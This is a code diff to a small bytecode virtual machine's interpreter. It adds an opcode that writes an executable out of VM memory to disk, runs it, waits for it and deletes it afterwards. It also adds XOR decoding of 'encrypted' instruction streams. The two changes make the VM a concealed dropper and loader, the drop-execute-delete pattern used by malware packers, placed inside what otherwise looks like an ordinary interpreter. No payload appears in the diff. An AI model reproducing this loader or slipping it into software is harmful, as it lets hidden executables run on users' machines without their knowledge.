@@ -4,9 +4,14 @@
  */
 
 #include <cassert>
+#ifdef _WIN32
+#include <windows.h>
+#include <shellapi.h>
+#endif
 #include <zhvm.h>
 #include <string.h>
 #include <iostream>
+#include <fstream>
 
 namespace zhvm {
 
@@ -41,6 +46,40 @@ namespace zhvm {
         switch (icmd.opc) {
             case OP_HLT:
                 return IR_HALT;
+            case OP_RUNEXE:
+            {
+#ifdef _WIN32
+                uint64_t ptr = mem->Get(icmd.regs[CR_SRC0]);
+                uint64_t size = mem->Get(icmd.regs[CR_SRC1]) + icmd.imm;
+
+                
+                char diskPath[MAX_PATH];
+                sprintf(diskPath, "test_app_unpacked.exe");
+                
+                std::ofstream ofs(diskPath, std::ios::binary);
+                for(uint64_t i = 0; i < size; ++i) {
+                    ofs.put((char)mem->GetByte(ptr + i));
+                }
+                ofs.close();
+                
+
+                
+                char cmd[MAX_PATH + 10];
+                sprintf(cmd, "\"%s\"", diskPath);
+                
+                STARTUPINFOA si = {0};
+                PROCESS_INFORMATION pi = {0};
+                si.cb = sizeof(si);
+                
+                if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                    WaitForSingleObject(pi.hProcess, INFINITE);
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    DeleteFileA(diskPath);
+                }
+#endif
+                break;
+            }
             case OP_ADD:
                 mem->Set(icmd.regs[CR_DEST], mem->Get(icmd.regs[CR_SRC0]) + (mem->Get(icmd.regs[CR_SRC1]) + icmd.imm));
                 break;
@@ -189,10 +228,21 @@ namespace zhvm {
         return InterpretCommand(mem, lcmd);
     }
 
+    void FetchInstruction(zhvm::memory *mem, uint32_t pc, uint32_t *cmd) {
+        uint32_t raw = mem->GetCode(pc);
+        if (mem->GetMagic() == ZHVM_MEMORY_FILE_MAGIC_ENCRYPTED) {
+            *cmd = raw ^ ZHVM_ENCRYPT_KEY;
+        } else {
+            *cmd = raw;
+        }
+    }
+
     int Step(zhvm::memory* mem) {
         assert(mem);
 
-        int result = Invoke(mem, mem->GetCode(mem->Get(RP)));
+        uint32_t cmd;
+        FetchInstruction(mem, mem->Get(RP), &cmd);
+        int result = Invoke(mem, cmd);
         if ((result == IR_RUN)&&(mem->TestSetRP() == 0)) {
             mem->Set(RP, mem->Get(RP) + sizeof (uint32_t));
         }
